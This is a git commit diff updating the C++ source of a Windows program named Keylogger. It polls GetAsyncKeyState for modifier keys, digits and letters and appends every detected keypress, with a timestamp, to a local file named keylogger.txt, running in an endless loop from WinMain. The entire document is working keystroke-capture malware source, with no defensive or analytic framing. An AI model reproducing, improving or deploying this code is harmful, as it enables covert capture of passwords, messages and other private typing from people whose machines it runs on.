5f8c9f8740759cca9066d318cbd3a94eab34873f
najatheus1 <72266626+najatheus1@users.noreply.github.com>
2022-06-04 13:18:11 -0300

    Update main.cpp

--- Keylogger/main.cpp
+++ Keylogger/main.cpp
@@ -1,236 +1,254 @@
+#define _CRT_SECURE_NO_WARNINGS
+
 #include <windows.h>
 #include <fstream>
 #include <string>
 
-#define TIME_ 95
+#define TIME_ 10
+#define BUFER__ 400
+
+std::string getLocalTime() {
+	time_t time_;
+
+	std::time(&time_);
+	tm* s = localtime(&time_);
+
+	std::string time__ = std::to_string(s->tm_mday) + "/" + std::to_string(s->tm_mon + 1) +
+		"/" + std::to_string(s->tm_year + 1900) + " [Horas:" + std::to_string(s->tm_hour) + 
+		" Minutos: " + std::to_string(s->tm_min) + " Segundo: " + std::to_string(s->tm_sec) + 
+		+ "]";
+
+	return time__;
+}
 
 void logger() {
 	std::ofstream arq;
 	arq.open("keylogger.txt", std::ios::out | std::ios::app);
 
+	BYTE c[256];
 	if (GetAsyncKeyState(VK_CONTROL)) {
 		Sleep(TIME_);
-		arq << "CONTROL";
+		arq << "(" << getLocalTime() << ") " << ": [CONTROL]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x08)) {
 		Sleep(TIME_);
-		arq << "BACKSPACE";
+		arq << "(" << getLocalTime() << ") " << ": [BACKSPACE]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x09)) {
 		Sleep(TIME_);
-		arq << "TAB" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [TAB]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x0C)) {
 		Sleep(TIME_);
-		arq << "Chave CLEAR" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [Chave CLEAR]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x0D)) {
 		Sleep(TIME_);
-		arq << "ENTER" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [ENTER]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x10)) {
 		Sleep(TIME_);
-		arq << "SHIFT" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [SHIFT]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x12)) {
 		Sleep(TIME_);
-		arq << "ALT" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [ALT]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x13)) {
 		Sleep(TIME_);
-		arq << "PAUSE" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [PAUSE]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x14)) {
 		Sleep(TIME_);
-		arq << "CAPS LOCK " << " : ";
+		arq << "(" << getLocalTime() << ") " << ": [CAPS LOCK]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x30)) {
 		Sleep(TIME_);
-		arq << "0" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [0]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x31)) {
 		Sleep(TIME_);
-		arq << "1" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [1]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x32)) {
 		Sleep(TIME_);
-		arq << "2" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [2]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x33)) {
 		Sleep(TIME_);
-		arq << "3" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [3]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x34)) {
 		Sleep(TIME_);
-		arq << "4" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [4]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x35)) {
 		Sleep(TIME_);
-		arq << "5" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [5]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x36)) {
 		Sleep(TIME_);
-		arq << "6" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [6]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x37)) {
 		Sleep(TIME_);
-		arq << "7" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [7]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x38)) {
 		Sleep(TIME_);
-		arq << "8" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [8]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x39)) {
 		Sleep(TIME_);
-		arq << "9" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [9]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x41)) {
 		Sleep(TIME_);
-		arq << "A" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [A]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x42)) {
 		Sleep(TIME_);
-		arq << "B" << "\n";
+		arq << "(" << getLocalTime() << ") " <<  ": [B]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x43)) {
 		Sleep(TIME_);
-		arq << "C" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [C]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x44)) {
 		Sleep(TIME_);
-		arq << "D" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [D]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x45)) {
 		Sleep(TIME_);
-		arq << "E" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [E]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x46)) {
 		Sleep(TIME_);
-		arq << "F" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [F]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x47)) {
 		Sleep(TIME_);
-		arq << "G" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [G]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x48)) {
 		Sleep(TIME_);
-		arq << "H" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [H]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x49)) {
 		Sleep(TIME_);
-		arq << "I" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [I]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4A)) {
 		Sleep(TIME_);
-		arq << "J" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [J]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4B)) {
 		Sleep(TIME_);
-		arq << "K" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [K]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4C)) {
 		Sleep(TIME_);
-		arq << "L" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [L]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4D)) {
 		Sleep(TIME_);
-		arq << "M" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [M]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4E)) {
 		Sleep(TIME_);
-		arq << "N" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [N]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x4F)) {
 		Sleep(TIME_);
-		arq << "O" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [O]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x50)) {
 		Sleep(TIME_);
-		arq << "P" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [P]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x51)) {
 		Sleep(TIME_);
-		arq << "Q" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [Q]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x52)) {
 		Sleep(TIME_);
-		arq << "R" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [R]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x53)) {
 		Sleep(TIME_);
-		arq << "S" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [S]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x54)) {
 		Sleep(TIME_);
-		arq << "T" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [T]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x55)) {
 		Sleep(TIME_);
-		arq << "U" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [U]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x56)) {
 		Sleep(TIME_);
-		arq << "V" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [V]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x57)) {
 		Sleep(TIME_);
-		arq << "W" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [W]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x58)) {
 		Sleep(TIME_);
-		arq << "X" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [X]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x59)) {
 		Sleep(TIME_);
-		arq << "Y" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [Y]\n";
 		arq.close();
 	}
 	if (GetAsyncKeyState(0x5A)) {
 		Sleep(TIME_);
-		arq << "Z" << "\n";
+		arq << "(" << getLocalTime() << ") " << ": [Z]\n";
 		arq.close();
 	}
 }
@@ -250,12 +268,12 @@ int APIENTRY WinMain(_In_ HINSTANCE hinstance, _In_opt_ HINSTANCE hprevinstance,
 	switch (info)
 	{
 	case 1:
-		while (true) {
+		for(;;){
 			logger();
 		}
 	case 2:
 		MessageBox(NULL, "Programa fechado!.", "Keylogger", MB_OK | MB_ICONQUESTION);
 	}
-	
+
 	return 0;
 }
